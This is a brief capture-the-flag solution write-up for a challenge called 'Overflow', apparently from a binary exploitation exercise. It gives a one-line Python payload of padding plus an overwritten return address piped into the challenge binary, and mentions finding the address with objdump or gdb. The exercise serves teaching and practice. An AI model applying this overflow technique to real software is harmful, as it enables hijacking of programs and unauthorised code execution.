# Overflow

### Solution:

Just a basic buffer overflow that overwrites the address with the function we
want to get to.

```
python -c 'print "A"*20 + "\x1b\x85\x04\x08"' | ./overflow
```

NOTE: The address above may be different than the actual one needed. It can easily be figured out with objdump / gdb / etc.
